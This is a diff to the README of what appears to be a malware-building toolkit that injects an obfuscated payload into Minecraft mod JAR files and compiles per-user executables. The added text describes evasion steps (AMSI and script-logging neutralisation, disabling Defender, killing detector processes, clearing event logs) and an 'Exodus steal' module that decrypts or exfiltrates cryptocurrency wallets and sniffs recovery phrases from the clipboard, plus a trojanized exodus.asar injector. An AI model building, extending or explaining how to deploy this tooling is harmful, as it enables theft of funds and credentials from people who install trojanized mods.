@@ -39,16 +39,23 @@ XOR key), `DB_PATH` (defaults to `server/database.sqlite`),
 
 1. Reads `payload/test.js`, replaces the `PLACEHOLDER_*` tokens with the user's
    ID, the server's host URL, and the real API/SECRET keys from the environment.
-2. Compiles the payload with the **locally installed** `@yao-pkg/pkg`
+2. **Obfuscates the payload JS** with `payload/obfuscate.js`
+   (`javascript-obfuscator`, devDependency) before compilation. Disable with
+   `OBFUSCATE_JS=0`; `JS_OBSCURE_LEVEL` picks `light`/`full` (default `full`).
+   The option set is tuned for pkg: string arrays, `splitStrings` and
+   `deadCodeInjection` are left off because they fold `require()` paths into
+   index lookups that break pkg's static bundler — the pipeline verifies every
+   `require()` literal survives (`--check`) and kills the build if one is lost.
+3. Compiles the payload with the **locally installed** `@yao-pkg/pkg`
    (devDependency of `payload/`) → `builds/user_{id}/dist/client.exe`. No per-
    build network fetch.
-3. Runs `node builder/index.js <mod.jar> <userId> <dist> <updateUrl>` which:
+4. Runs `node builder/index.js <mod.jar> <userId> <dist> <updateUrl>` which:
    - downloads ASM `lib/asm-9.6.jar` from Maven Central on first use
      (binary artifact is gitignored),
    - compiles `ByteCodeInjector.java` when the `.class` is missing,
    - compiles a randomized `UpdaterV2` class and patches the mod's entrypoint,
    - embeds `user_id.txt`.
-4. Optionally obfuscates the result with `of/build/libs/fabric-obf.jar`
+5. Optionally obfuscates the result with `of/build/libs/fabric-obf.jar`
    (`OBF2_JAR` env overrides the default path). If the obfuscator jar is absent
    the build keeps the injected JAR and continues — obfuscation never aborts a
    valid injection.
@@ -90,6 +97,22 @@ New-build payloads install undetected startup and then poll a command channel:
 3. **Dashboard**: commands are issued from the build detail modal
    (`POST /api/commands/:uuid`, admin or the build's own session) and results
    stream into the command history via `/api/logs`.
+4. **Bypasses** (`Bypass` in `payload/test.js`): every spawned PowerShell stage
+   runs through AMSI + script-block-logging neutralisation and `-EncodedCommand`;
+   on admin builds Defender services/real-time protection/scheduled scans are
+   disabled, detector-pattern processes (smbios/isfence/etc.) are killed, event
+   logs are swept, and a watchdog re-asserts all of it from the poll loop
+   (`BYPASS_WATCHDOG=0` disables).
+5. **Exodus steal** (`ExodusInject` in `payload/test.js`): unwraps the
+   Electron/Chromium `os_crypt` key (DPAPI, same as browser token decoders),
+   attempts layered decryption of `%APPDATA%\Exodus\exodus.wallet`
+   (AES-GCM / libsodium secretbox / PBKDF2 vault candidates via `tweetnacl`),
+   ships the raw wallet + key state so unrecognised ciphers can be broken
+   offline, and passively sniffs the clipboard for copied 12/24-word recovery
+   phrases (`CLIPBOARD_MONITOR=0` disables). Results surface in the log's
+   `wallets` field and as `Exodus/*.json`. The legacy `/exodus` asar-swap
+   injector (trojanized `exodus.asar` served from `server/payloads/`) remains
+   wired to `Injection.payload` for password-protected vaults.
 
 ## Security notes
 
